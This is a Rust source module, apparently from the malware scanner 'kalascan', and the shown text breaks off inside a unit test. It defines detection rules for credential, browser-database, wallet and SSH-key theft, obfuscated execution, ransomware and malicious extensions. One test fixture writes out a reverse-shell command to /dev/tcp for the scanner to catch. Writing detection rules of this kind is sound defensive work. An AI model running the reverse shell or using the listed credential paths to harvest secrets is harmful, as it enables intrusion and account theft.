use crate::RuleMatch;
use regex::Regex;
use std::path::Path;
use walkdir::WalkDir;

/// Human-readable ruleset version (also surfaced by `kalascan rules`).
pub const RULESET_VERSION: &str = "2026.10";

/// Critical file extensions for scanning
const CRITICAL_EXTENSIONS: &[&str] = &[
    ".py", ".js", ".ts", ".mjs", ".cjs", ".sh", ".bat", ".ps1", ".vbs", ".php", ".java", ".kt",
];

/// Critical filenames (exact match)
const CRITICAL_FILENAMES: &[&str] = &["package.json", "setup.py", "manifest.json", "plugin.xml"];

/// Prose files: never executed, and READMEs routinely quote IOC strings that
/// trip YARA. Skipped for the YARA-only pass on non-script files.
const DOC_EXTENSIONS: &[&str] = &[".md", ".markdown", ".rst", ".txt", ".adoc"];

/// Per-file read cap. Larger files are scanned up to this size and flagged,
/// never skipped: padding a payload past the cap used to hide it entirely.
const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024;

/// Finding name for critical files larger than `MAX_SCAN_BYTES`.
pub const OVERSIZED_FINDING: &str = "Oversized File (partially scanned)";

/// Rule names the correlation pass keys on (see `correlate.rs`).
pub const LOCAL_SERVER: &str = "Local Network Server";
pub const UPLOAD_HANDLER: &str = "HTTP File Upload Handler";
pub const ARCHIVE_EXTRACTION: &str = "Archive Extraction";

pub struct Rule {
    pub name: &'static str,
    pub pattern: Regex,
    pub severity: &'static str,
    #[allow(dead_code)]
    pub description: &'static str,
    pub category: &'static str,
}

impl Rule {
    pub fn applies_to(&self, ext: &str, filename: &str) -> bool {
        if self.category == "obfuscation" {
            return true;
        }
        if self.category == "exfiltration" {
            return CRITICAL_EXTENSIONS.contains(&ext) || CRITICAL_FILENAMES.contains(&filename);
        }
        if self.category == "file_access" {
            return CRITICAL_EXTENSIONS.contains(&ext);
        }
        true
    }
}

/// Build static analysis rules.
/// Uses `boxed_regex` via `Regex::new().unwrap()` at startup — compiled once.
pub fn build_rules() -> Vec<Rule> {
    vec![
        // ============================================================
        // EXFILTRATION ENDPOINTS
        // ============================================================
        Rule {
            name: "Discord Webhook",
            pattern: Regex::new(r"discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]{30,}").unwrap(),
            severity: "critical",
            description: "Discord webhook URL — data exfiltration",
            category: "exfiltration",
        },
        Rule {
            name: "Telegram Bot API Token",
            pattern: Regex::new(r"(?:https?://)?api\.telegram\.org/bot\d{8,10}:[a-zA-Z0-9_-]{35,40}/").unwrap(),
            severity: "critical",
            description: "Telegram Bot API token — C2/exfiltration channel",
            category: "exfiltration",
        },
        Rule {
            name: "Slack Webhook",
            pattern: Regex::new(r"hooks\.slack\.com/services/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+").unwrap(),
            severity: "high",
            description: "Slack webhook URL — potential data exfiltration",
            category: "exfiltration",
        },
        Rule {
            name: "Hardcoded IP Address",
            pattern: Regex::new(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b").unwrap(),
            severity: "medium",
            description: "Hardcoded IP address — potential C2 server",
            category: "exfiltration",
        },
        Rule {
            name: "AWS Access Key",
            pattern: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
            severity: "critical",
            description: "AWS Access Key ID detected — credential leak",
            category: "exfiltration",
        },
        Rule {
            name: "AWS Secret Key",
            pattern: Regex::new(r#"(?i)(?:aws_secret_access_key|secretAccessKey)\s*[:=]\s*['"][a-zA-Z0-9/+=]{40}['"]"#).unwrap(),
            severity: "critical",
            description: "AWS Secret Access Key detected — credential leak",
            category: "exfiltration",
        },
        Rule {
            name: "GitHub Token",
            pattern: Regex::new(r"ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,}").unwrap(),
            severity: "critical",
            description: "GitHub token detected — credential leak",
            category: "exfiltration",
        },
        Rule {
            name: "Generic API Key",
            pattern: Regex::new(r#"(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*['"][a-zA-Z0-9_-]{16,}['"]"#).unwrap(),
            severity: "high",
            description: "Generic API key or secret detected",
            category: "exfiltration",
        },
        Rule {
            name: "Generic Webhook URL",
            pattern: Regex::new(r"https?://[a-zA-Z0-9.-]+/webhook(?:s)?/").unwrap(),
            severity: "medium",
            description: "Generic webhook URL — potential exfiltration endpoint",
            category: "exfiltration",
        },
        Rule {
            name: "Slack Bot Token",
            pattern: Regex::new(r"xox[baprs]-[0-9a-zA-Z-]{10,}").unwrap(),
            severity: "high",
            description: "Slack bot token detected — credential leak",
            category: "exfiltration",
        },

        // ============================================================
        // SENSITIVE DATA ACCESS
        // ============================================================
        Rule {
            name: "Browser Profile Access",
            pattern: Regex::new(r"(?i)(?:/AppData/Local/(?:Google/)?Chrome|/AppData/Roaming/Discord|Mozilla/Firefox/Profiles)").unwrap(),
            severity: "critical",
            description: "Browser profile/user data access — credential theft",
            category: "file_access",
        },
        Rule {
            name: "Crypto Wallet Access",
            // Wallet data dirs and wallet browser-extension IDs; bare words like
            // "wallet"/"phantom" matched PhantomJS polyfills in every Vue bundle.
            pattern: Regex::new(r#"(?i)(?:wallet\.dat|["'\\/]\.(?:bitcoin|ethereum|electrum)\b|Ethereum[\\/]keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)"#).unwrap(),
            severity: "critical",
            description: "Crypto wallet access — crypto theft indicator",
            category: "file_access",
        },
        Rule {
            name: "Password Manager Access",
            pattern: Regex::new(r#"(?i)(?:passwords?\.txt|passwd|credentials\.dat|login\.json|\.npmrc|(?:^|[\\/"'])[.]env\b)"#).unwrap(),
            severity: "high",
            description: "Credential file access detected",
            category: "file_access",
        },
        Rule {
            name: "Browser Database Access",
            // File names inside a browser profile; bare "Cookies" matched every
            // `_canUseCookies` / `disableCookies` identifier in telemetry SDKs.
            pattern: Regex::new(r#"(?i:["'/\\](?:Login Data|Web Data|Local State)["'/\\]|cookies\.sqlite|logins\.json|key4\.db)|(?:Network|Default)[\\/]Cookies\b"#).unwrap(),
            severity: "high",
            description: "Browser database — session/cookie theft",
            category: "file_access",
        },
        Rule {
            name: "Discord Token Harvesting",
            pattern: Regex::new(r#"(?i)(?:Discord[\\/]Local Storage[\\/]leveldb|discord\.ptb|discord\.canary)"#).unwrap(),
            severity: "critical",
            description: "Discord token file access — account theft",
            category: "file_access",
        },
        Rule {
            name: "SSH Key Access",
            pattern: Regex::new(r"(?i)(?:/\.ssh/|id_rsa|id_dsa|authorized_keys|known_hosts)").unwrap(),
            severity: "high",
            description: "SSH key access — unauthorized access risk",
            category: "file_access",
        },
        Rule {
            name: "Environment Variable Dump",
            pattern: Regex::new(r"(?i)(?:os\.environ|process\.env|getenv\b)").unwrap(),
            severity: "medium",
            description: "Environment variable access — may contain secrets",
            category: "file_access",
        },

        // ============================================================
        // OBFUSCATION & DYNAMIC EXECUTION
        // ============================================================
        Rule {
            name: "eval() Usage",
            // Not `obj.eval(`; the regex crate has no look-behind, so the
            // preceding char is part of the match.
            pattern: Regex::new(r"(?m)(?:^|[^.\w$\n])eval\s*\(").unwrap(),
            severity: "high",
            description: "eval() — arbitrary code execution risk",
            category: "obfuscation",
        },
        Rule {
            name: "exec() Usage",
            // Not `re.exec(` (JS RegExp), which is in nearly every bundle.
            pattern: Regex::new(r"(?m)(?:^|[^.\w$\n])exec\s*\(").unwrap(),
            severity: "high",
            description: "exec() — arbitrary code execution risk",
            category: "obfuscation",
        },
        Rule {
            name: "b64decode + exec Chain",
            pattern: Regex::new(r"(?i)(?:base64\.b64decode|b64decode|from_base64).*(?:exec|eval|run)").unwrap(),
            severity: "critical",
            description: "Base64 decode + exec/eval chain — obfuscation",
            category: "obfuscation",
        },
        Rule {
            name: "nested b64decode",
            pattern: Regex::new(r"(?i)(?:base64\.b64decode\s*\(\s*base64|b64decode\s*\(\s*b64decode)").unwrap(),
            severity: "critical",
            description: "Nested base64 decoding — multi-layer obfuscation",
            category: "obfuscation",
        },
        Rule {
            name: "child_process (Node.js)",
            pattern: Regex::new(r"(?:child_process\.exec|child_process\.execSync|child_process\.spawn)").unwrap(),
            severity: "high",
            description: "child_process — command injection or payload execution",
            category: "obfuscation",
        },
        Rule {
            name: "subprocess (Python)",
            pattern: Regex::new(r"(?:subprocess\.(?:call|Popen|run|check_output|getoutput|check_call))").unwrap(),
            severity: "high",
            description: "subprocess — command execution or payload",
            category: "obfuscation",
        },
        Rule {
            name: "os.system",
            pattern: Regex::new(r"os\.system\s*\(").unwrap(),
            severity: "high",
            description: "os.system() — shell command execution",
            category: "obfuscation",
        },
        Rule {
            name: "PowerShell Encoded Command",
            pattern: Regex::new(r"(?i)(?:-EncodedCommand\s+[a-zA-Z0-9+/=]{50,}|powershell\s+.*-enc\b)").unwrap(),
            severity: "critical",
            description: "PowerShell encoded command — obfuscated execution",
            category: "obfuscation",
        },
        Rule {
            name: "Base64 Overuse",
            pattern: Regex::new(r#"(?i)(?:from\s+base64\s+import|import\s+base64|require\(.base64.\))"#).unwrap(),
            severity: "medium",
            description: "Base64 module import — possible obfuscation",
            category: "obfuscation",
        },
        Rule {
            name: "Dynamic Import/Load",
            pattern: Regex::new(r#"(?i)(?:__import__\(|importlib|execScript|new Function)"#).unwrap(),
            severity: "medium",
            description: "Dynamic code loading — potential backdoor",
            category: "obfuscation",
        },
        Rule {
            name: "Hex Encoding",
            // 16+ consecutive escapes: short runs are regex char classes and
            // byte constants in every library.
            pattern: Regex::new(r"(?i)(?:\\x[0-9a-f]{2}){16,}").unwrap(),
            severity: "high",
            description: "Hex-encoded string sequence — obfuscated content",
            category: "obfuscation",
        },
        Rule {
            name: "XOR Decode Pattern",
            pattern: Regex::new(r"(?i)(?:ord\(.[^)]+.\)\s*\^\s*|charCodeAt\(.[^)]+.\)\s*\^\s*)").unwrap(),
            severity: "high",
            description: "XOR decoding — obfuscation technique",
            category: "obfuscation",
        },
        Rule {
            name: "Long Encoded String",
            pattern: Regex::new(r#"[a-zA-Z0-9+/=]{200,}"#).unwrap(),
            severity: "medium",
            description: "Very long encoded string — potential payload",
            category: "obfuscation",
        },
        Rule {
            name: "os.popen",
            pattern: Regex::new(r"os\.popen\s*\(").unwrap(),
            severity: "high",
            description: "os.popen() — shell command execution",
            category: "obfuscation",
        },
        Rule {
            name: "Process Injection",
            pattern: Regex::new(r"(?i)(?:VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx|RtlCreateUserThread)").unwrap(),
            severity: "critical",
            description: "Windows process injection API calls — malware indicator",
            category: "obfuscation",
        },
        Rule {
            name: "Reflective DLL Loading",
            // LoadLibraryA/GetProcAddress are in every native binding; static
            // triage already reports them as imports.
            pattern: Regex::new(r"ReflectiveLoader").unwrap(),
            severity: "critical",
            description: "Reflective DLL loading — code injection technique",
            category: "obfuscation",
        },

        // ============================================================
        // RANSOMWARE / DESTRUCTIVE
        // ============================================================
        Rule {
            name: "Mass File Encryption",
            pattern: Regex::new(r"(?i)(?:encrypt_file|encrypt_all|cipher\.encrypt|\.encrypt\s*\(|fernet\b.*encrypt)").unwrap(),
            severity: "critical",
            description: "File encryption function — potential ransomware",
            category: "ransomware",
        },
        Rule {
            name: "Shadow Copy Deletion",
            pattern: Regex::new(r"(?i)(?:vssadmin|wmic shadowcopy|bcdedit|bootsect|recovery\s+mode)").unwrap(),
            severity: "critical",
            description: "Shadow copy/backup deletion — ransomware indicator",
            category: "ransomware",
        },
        Rule {
            name: "Encrypted File Extension",
            // Quoted extension literal only: `.encoder` / `.encrypt(` are not file names.
            pattern: Regex::new(r#"(?i)["'`]\.(?:enc(?:rypted)?|locked|crypted|crypt|cry)["'`]"#).unwrap(),
            severity: "high",
            description: "Encrypted file extension — ransomware victim pattern",
            category: "ransomware",
        },
        Rule {
            name: "Ransom Note",
            pattern: Regex::new(r"(?i)(?:ransom(?:note|ware)|how_to_decrypt|readme_decrypt|your_files|your_data\b|pay\s+\d+\s+btc)").unwrap(),
            severity: "critical",
            description: "Ransom note text — ransomware indicator",
            category: "ransomware",
        },
        Rule {
            name: "Bitcoin Payment Address",
            pattern: Regex::new(r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap(),
            severity: "high",
            description: "Bitcoin address — potential ransom payment",
            category: "ransomware",
        },

        // ============================================================
        // SUPPLY CHAIN ATTACK
        // ============================================================
        Rule {
            name: "Post-Install Script",
            pattern: Regex::new(r#"(?i)"postinstall"\s*:\s*"|"preinstall"\s*:\s*""#).unwrap(),
            severity: "high",
            description: "npm postinstall/preinstall — supply chain attack vector",
            category: "supply_chain",
        },
        // Typo-squats are found by edit distance in `cve::typosquat_matches`;
        // the old regex here listed the legitimate package names.
        Rule {
            name: LOCAL_SERVER,
            pattern: Regex::new(r#"(?:\bexpress\s*\(\s*\)|\b(?:http|https|net)\.createServer\s*\(|\bHTTPServer\s*\(|socketserver\.TCPServer|\.run\s*\(\s*host\s*=\s*["']0\.0\.0\.0)"#).unwrap(),
            severity: "medium",
            description: "Starts a network listener — reachable by other hosts or by web pages via CSRF",
            category: "network",
        },
        Rule {
            name: UPLOAD_HANDLER,
            pattern: Regex::new(r"(?:\bmulter\s*\(|\bformidable\s*\(|\bbusboy\b|\bupload\.(?:single|array|fields)\s*\()").unwrap(),
            severity: "medium",
            description: "Accepts file uploads over HTTP",
            category: "network",
        },
        Rule {
            name: ARCHIVE_EXTRACTION,
            pattern: Regex::new(r"(?:\bzip\.files\b|\.entryName\b|\bentry\.fileName\b|\.extractAllTo\s*\(|\.extractall\s*\(|\btarfile\.open\s*\(|\bzipfile\.ZipFile\s*\()").unwrap(),
            severity: "medium",
            description: "Extracts archive entries to disk",
            category: "file_write",
        },
        Rule {
            name: "Remote Script Download",
            pattern: Regex::new(r#"(?i)(?:curl\s+-s(?:SL)?\s+https?://|wget\s+-q\s+https?://)\S+\.(?:ps1|sh|bat|py)\b"#).unwrap(),
            severity: "high",
            description: "Remote script download — payload delivery",
            category: "supply_chain",
        },
        Rule {
            name: "URL Fetch Command",
            pattern: Regex::new(r"(?i)(?:Invoke-WebRequest|curl\b|wget\b|fetch\(|axios\.get|request\.get)").unwrap(),
            severity: "medium",
            description: "URL fetching — possible external payload download",
            category: "supply_chain",
        },
        Rule {
            name: "Hidden Directory Script",
            pattern: Regex::new(r"(?i)[\\/]\.\w+[\\/](?:install|setup|config)").unwrap(),
            severity: "medium",
            description: "Script in hidden directory — suspicious",
            category: "supply_chain",
        },

        // ============================================================
        // VS CODE EXTENSION / IDE PLUGIN SECURITY
        // ============================================================
        Rule {
            name: "VS Code Session/Token Stealing",
            pattern: Regex::new(r"(?i)vscode\.authentication\.getSession\s*\(").unwrap(),
            severity: "critical",
            description: "Accessing VS Code authentication session — token theft indicator",
            category: "exfiltration",
        },
        Rule {
            name: "VS Code Clipboard Harvesting",
            pattern: Regex::new(r"(?i)vscode\.env\.clipboard\.readText\s*\(").unwrap(),
            severity: "high",
            description: "Reading clipboard contents silently in extension",
            category: "file_access",
        },
        Rule {
            name: "VS Code Workspace File Reading",
            pattern: Regex::new(r"(?i)vscode\.workspace\.fs\.readFile\s*\(").unwrap(),
            severity: "medium",
            description: "Reading workspace files via VS Code API",
            category: "file_access",
        },
        Rule {
            name: "Installed Extension Tampering",
            pattern: Regex::new(r#"(?i)[\\/]\.vscode[\\/]extensions[\\/]"#).unwrap(),
            severity: "critical",
            description: "References another installed extension's directory — supply-chain tampering",
            category: "supply_chain",
        },
        Rule {
            name: "VS Code Wildcard Activation",
            pattern: Regex::new(r#"(?i)"activationEvents"\s*:\s*\[[^\]]*["'](?:\*|onStartupFinished)["']"#).unwrap(),
            severity: "medium",
            description: "Extension executes automatically on startup without user trigger",
            category: "supply_chain",
        },

        // ============================================================
        // JETBRAINS PLUGIN MALWARE RULES
        // ============================================================
        Rule {
            name: "JetBrains Dynamic Classloading",
            pattern: Regex::new(r"(?i)(?:URLClassLoader|ClassLoader\.defineClass|DexClassLoader)\s*\(").unwrap(),
            severity: "critical",
            description: "Dynamic Java/Kotlin classloader — payload injection indicator",
            category: "obfuscation",
        },
        Rule {
            name: "JetBrains Process Execution",
            pattern: Regex::new(r"(?i)(?:Runtime\.getRuntime\(\)\.exec|ProcessBuilder)\s*\(").unwrap(),
            severity: "high",
            description: "Executing OS processes from plugin code",
            category: "obfuscation",
        },
        Rule {
            name: "JetBrains Malicious Reflection",
            pattern: Regex::new(r"(?i)(?:Method\.invoke|Field\.setAccessible)\s*\(").unwrap(),
            severity: "medium",
            description: "Java reflection to bypass access control or security managers",
            category: "obfuscation",
        },
        Rule {
            name: "JetBrains Raw Socket Exfiltration",
            pattern: Regex::new(r"(?i)java\.net\.(?:Socket|HttpURLConnection|URL)\s*").unwrap(),
            severity: "medium",
            description: "Raw networking call for beaconing or exfiltration",
            category: "exfiltration",
        },

        // ============================================================
        // CHROME / BROWSER EXTENSION MALWARE RULES
        // ============================================================
        Rule {
            name: "Browser Extension Dangerous Permissions",
            pattern: Regex::new(r#"(?i)"(?:permissions|optional_permissions)"\s*:\s*\[[^\]]*["'](?:\*://\*|<all_urls>|webRequestBlocking|debugger|nativeMessaging)["']"#).unwrap(),
            severity: "high",
            description: "High-risk browser extension permission targeting all network traffic or debugging",
            category: "supply_chain",
        },
        Rule {
            name: "Browser Extension Dynamic Code Execution",
            // `unsafe-eval` only matters inside a manifest CSP, not in a warning string.
            pattern: Regex::new(r#"(?i)(?:chrome\.tabs\.executeScript|"content_security_policy"[^\n]*unsafe-eval)"#).unwrap(),
            severity: "high",
            description: "Dynamic script injection or CSP unsafe-eval in extension",
            category: "obfuscation",
        },
        Rule {
            name: "Browser Extension Keystroke Logger",
            pattern: Regex::new(r#"(?i)addEventListener\s*\(\s*["']key(?:down|press|up)["']"#).unwrap(),
            severity: "high",
            description: "Key event listener indicating potential keylogger",
            category: "exfiltration",
        },
        Rule {
            name: "Browser Extension Cookie/Token Theft",
            pattern: Regex::new(r"(?i)chrome\.(?:cookies\.getAll|storage\.local\.get)").unwrap(),
            severity: "high",
            description: "Harvesting browser cookies or local extension storage",
            category: "file_access",
        },
    ]
}

pub fn is_critical_file(filename: &str) -> bool {
    let lower = filename.to_lowercase();
    if CRITICAL_FILENAMES.contains(&lower.as_str()) {
        return true;
    }
    CRITICAL_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

pub fn get_extension(filename: &str) -> &str {
    let lower = filename.to_lowercase();
    for ext in CRITICAL_EXTENSIONS {
        if lower.ends_with(ext) {
            return ext;
        }
    }
    ""
}

/// Scan directory, optionally restricted to `changed` repo-relative paths
/// (used by `--changed-only` for PR scans).
pub fn scan_directory_filtered<P: AsRef<Path>>(
    dir: P,
    custom_yara_dir: Option<&Path>,
    changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
) -> (usize, usize, Vec<RuleMatch>) {
    let rules = build_rules();
    let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
    let mut matches = Vec::new();
    let mut total_files = 0usize;
    let mut targets: Vec<Target> = Vec::new();
    let mut scanned_files = 0usize;

    // `node_modules` is scanned: in a VSIX/CRX it is shipped, executed code
    // and the obvious place to hide a payload.
    let skip_dirs: &[&str] = &[
        ".git",
        "__pycache__",
        ".tox",
        ".eggs",
        "target",
        "venv",
        ".venv",
    ];

    // Phase 1: collect candidate files (same order as the old single pass,
    // so results stay deterministic).
    for entry in WalkDir::new(dir.as_ref()).into_iter().filter_entry(|e| {
        let name = e.file_name().to_string_lossy();
        !e.path().is_dir() || !skip_dirs.contains(&name.as_ref())
    }) {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };

        if !entry.file_type().is_file() {
            continue;
        }

        total_files += 1;

        let filename = entry.file_name().to_string_lossy().to_string();
        let critical = is_critical_file(&filename);
        let lower = filename.to_lowercase();
        if !critical && DOC_EXTENSIONS.iter().any(|ext| lower.ends_with(ext)) {
            continue;
        }

        let rel_path = entry
            .path()
            .strip_prefix(dir.as_ref())
            .unwrap_or(entry.path())
            .to_string_lossy()
            .to_string();

        // `--changed-only` filter: skip files not in the changed set
        if let Some(changed) = changed {
            if !changed.contains(std::path::Path::new(&rel_path)) {
                continue;
            }
        }

        scanned_files += critical as usize;
        targets.push(Target {
            rel_path,
            filename,
            abs_path: entry.path().to_path_buf(),
            critical,
        });
    }

    // Phase 2: scan candidate files in parallel (chunks preserve order,
    // so concatenating the chunk results equals the sequential output).
    let workers = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4)
        .min(16);
    let chunk_size = targets.len().div_ceil(workers).max(1);
    std::thread::scope(|scope| {
        let handles: Vec<_> = targets
            .chunks(chunk_size)
            .map(|chunk| scope.spawn(|| scan_files(chunk, &rules, &yara_engine)))
            .collect();
        for handle in handles {
            matches.extend(handle.join().unwrap_or_default());
        }
    });
    let chains = crate::correlate::correlate_package(&matches);
    matches.extend(chains);

    (total_files, scanned_files, matches)
}

struct Target {
    rel_path: String,
    filename: String,
    abs_path: std::path::PathBuf,
    /// Script/manifest file: gets RegEx + entropy rules. Every file gets YARA.
    critical: bool,
}

/// Read at most `MAX_SCAN_BYTES`, returning the bytes and the real file size.
fn read_capped(path: &Path) -> Option<(Vec<u8>, u64)> {
    use std::io::Read;
    let file = std::fs::File::open(path).ok()?;
    let size = file.metadata().ok()?.len();
    let mut buf = Vec::new();
    file.take(MAX_SCAN_BYTES).read_to_end(&mut buf).ok()?;
    Some((buf, size))
}

/// Scan one chunk of targets.
fn scan_files(
    targets: &[Target],
    rules: &[Rule],
    yara_engine: &crate::yara_engine::YaraEngine,
) -> Vec<RuleMatch> {
    let mut matches = Vec::new();
    for Target {
        rel_path,
        filename,
        abs_path,
        critical,
    } in targets
    {
        let Some((bytes, size)) = read_capped(abs_path) else {
            continue;
        };

        if !critical {
            matches.extend(yara_engine.scan_data(rel_path, &bytes));
            if crate::workflow::is_workflow(rel_path) {
                matches.extend(crate::workflow::scan(
                    rel_path,
                    &String::from_utf8_lossy(&bytes),
                ));
            }
            continue;
        }

        // Lossy: one invalid byte used to make read_to_string fail and skip the file.
        let content = String::from_utf8_lossy(&bytes);

        // Whole-file inline suppression marker
        if content.contains("kalascan:ignore-file") {
            continue;
        }

        if size > MAX_SCAN_BYTES {
            matches.push(RuleMatch {
                file_path: rel_path.clone(),
                line_number: 1,
                matched_pattern: OVERSIZED_FINDING.to_string(),
                severity: "low".to_string(),
                context: format!(
                    "File is {} bytes; only the first {} MiB were scanned",
                    size,
                    MAX_SCAN_BYTES / (1024 * 1024)
                ),
            });
        }

        let file_start = matches.len();
        let newlines: Vec<usize> = content.match_indices('\n').map(|(i, _)| i).collect();
        let ext = get_extension(filename);

        for rule in rules {
            if !rule.applies_to(ext, filename) {
                continue;
            }

            for cap in rule.pattern.find_iter(&content) {
                if line_has_ignore_marker(&content, cap.start())
                    || is_comment_only_line(&content, cap.start())
                {
                    continue;
                }
                if rule.name == "Hardcoded IP Address" && !is_public_ipv4(cap.as_str()) {
                    continue;
                }
                let context = get_context(&content, cap.start(), cap.end());

                matches.push(RuleMatch {
                    file_path: rel_path.clone(),
                    line_number: newlines.partition_point(|&i| i < cap.start()) + 1,
                    matched_pattern: rule.name.to_string(),
                    severity: rule.severity.to_string(),
                    context,
                });
            }
        }

        // Advanced entropy, invisible zero-width, Trojan Source, homoglyphs.
        // Guarded: a panic here must not drop the other files in this chunk
        // (a UTF-8 slicing bug used to do exactly that).
        let entropy_matches = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            crate::entropy::scan_advanced_obfuscation(rel_path, &content)
        }))
        .unwrap_or_default();
        matches.extend(entropy_matches);

        // YARA rules matching
        let yara_matches = yara_engine.scan_data(rel_path, content.as_bytes());
        matches.extend(yara_matches);

        let chains = crate::correlate::correlate_file(rel_path, &content, &matches[file_start..]);
        matches.extend(chains);
    }
    matches
}

/// Loopback, private, link-local and version-like invalid quads are not C2.
fn is_public_ipv4(text: &str) -> bool {
    match text.parse::<std::net::Ipv4Addr>() {
        Ok(ip) => {
            !(ip.is_loopback()
                || ip.is_private()
                || ip.is_link_local()
                || ip.is_unspecified()
                || ip.is_broadcast()
                || ip.is_documentation())
        }
        Err(_) => false,
    }
}

fn line_has_ignore_marker(content: &str, start: usize) -> bool {
    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
    let line_end = content[start..]
        .find('\n')
        .map(|i| start + i)
        .unwrap_or(content.len());
    content[line_start..line_end].contains("kalascan:ignore")
}

/// True when the match sits inside a comment (`//`, `#`, `/* ... */`).
/// Commented-out code is not executed; flagging it was pure noise.
fn is_comment_only_line(content: &str, start: usize) -> bool {
    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
    let before = &content[line_start..start];
    let trimmed = before.trim_start();
    if trimmed.starts_with("//") || trimmed.starts_with('#') {
        return true;
    }
    match (before.rfind("/*"), before.rfind("*/")) {
        (Some(open), Some(close)) => open > close,
        (Some(_), None) => true,
        _ => false,
    }
}

fn get_context(content: &str, start: usize, end: usize) -> String {
    let before = content[..start]
        .rsplit('\n')
        .take(3)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join("\n");

    let matched = &content[start..end];
    let after = content[end..]
        .split('\n')
        .take(3)
        .collect::<Vec<_>>()
        .join("\n");

    let mut ctx = format!("{}\n>>> {} <<<\n{}", before, matched, after);
    if ctx.len() > 200 {
        ctx = format!("{}...", &ctx[..200]);
    }
    ctx
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_directory_filtered_parallel_is_deterministic() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("a.py"),
            "discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("b.py"), "eval('x')\n").unwrap();

        let (total, scanned, mut first) = scan_directory_filtered(dir.path(), None, None);
        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, None);

        let key = |m: &RuleMatch| {
            (
                m.file_path.clone(),
                m.line_number,
                m.matched_pattern.clone(),
            )
        };
        first.sort_by_key(key);
        second.sort_by_key(key);
        assert_eq!(first, second);
        assert_eq!(total, 2);
        assert_eq!(scanned, 2);
        assert!(!first.is_empty());
    }

    #[test]
    fn test_evasion_tricks_no_longer_hide_files() {
        let dir = tempfile::tempdir().unwrap();
        // Invalid UTF-8 byte used to make the whole file unreadable.
        let mut bad_utf8 = b"\xff\xfe\n".to_vec();
        bad_utf8.extend_from_slice(b"eval(payload)\n");
        std::fs::write(dir.path().join("a.js"), bad_utf8).unwrap();
        // Padding past the old 1 MiB cap used to skip the file entirely.
        let mut padded = "eval(payload)\n".to_string();
        padded.push_str(&" ".repeat(MAX_SCAN_BYTES as usize));
        std::fs::write(dir.path().join("b.js"), padded).unwrap();
        // Non-script file: only YARA applies, it used to be skipped.
        std::fs::write(
            dir.path().join("payload.bin"),
            b"\x7fELF\x00/bin/sh -i >& /dev/tcp/10.0.0.1/4444\x00",
        )
        .unwrap();
        // Docs quoting IOCs are not payloads.
        std::fs::write(
            dir.path().join("README.md"),
            "Detects `/bin/sh -i >& /dev/tcp/` reverse shells\n",
        )
        .unwrap();

        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, None);
        assert_eq!((total, scanned), (4, 2));
        assert!(!matches.iter().any(|m| m.file_path == "README.md"));
        let has = |file: &str, rule: &str| {
            matches
                .iter()
                .any(|m| m.file_path == file && m.matched_pattern == rule)
        };
        assert!(has("a.js", "eval() Usage"));
        assert!(matches
            .iter()
            .any(|m| m.file_path == "a.js" && m.line_number == 2));
        assert!(has("b.js", "eval() Usage"));
        assert!(has("b.js", OVERSIZED_FINDING));
        assert!(has("payload.bin", "YARA Rule: ReverseShellGeneric"));
    }

    /// Every negative below is a real false positive from a clean VSIX.
    #[test]
    fn test_noisy_rules_ignore_library_code() {
        let rules = build_rules();
        let rule = |name: &str| &rules.iter().find(|r| r.name == name).unwrap().pattern;
        let cases: &[(&str, &str, bool)] = &[
            ("Crypto Wallet Access", "e.g., PhantomJS 1.x", false),
            (
                "Crypto Wallet Access",
                r#"path.join(home, ".ethereum", "keystore")"#,
                true,
            ),
            (
                "Crypto Wallet Access",
                "Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                true,
            ),
            (
                "Browser Database Access",
                "var cookies = require('./../helpers/cookies');",
                false,
            ),
            (
                "Browser Database Access",
                "U={_canUseCookies:void 0,disableCookies:P}",
                false,
            ),
            (
                "Browser Database Access",
                r#"path.join(profile, "Login Data")"#,
                true,
            ),
            ("Browser Database Access", r"Default\Network\Cookies", true),
            ("exec() Usage", "while ((match = tagRE.exec(text)))", false),
            ("exec() Usage", "exec(code, ns, ns)", true),
            ("eval() Usage", "window.eval(x)", false),
            (
                "Encrypted File Extension",
                "return this.encoder.write(e)",
                false,
            ),
            ("Encrypted File Extension", "file + '.locked'", true),
            (
                "Reflective DLL Loading",
                "GetProcAddress(h, \"Foo\")",
                false,
            ),
            ("Hex Encoding", r"/^[\x20\x09\x0a\x0d]*(.)/", false),
            ("Hex Encoding", &r"\x41".repeat(16), true),
            (
                "Browser Extension Dynamic Code Execution",
                "warn('prohibits unsafe-eval')",
                false,
            ),
            (
                "Browser Extension Dynamic Code Execution",
                r#""content_security_policy": "script-src 'self' 'unsafe-eval'""#,
                true,
            ),
        ];
        for (name, text, expected) in cases {
            assert_eq!(
                rule(name).is_match(text),
                *expected,
                "{} on {:?}",
                name,
                text
            );
        }
        assert!(!is_public_ipv4("127.0.0.1"));
        assert!(!is_public_ipv4("192.168.1.10"));
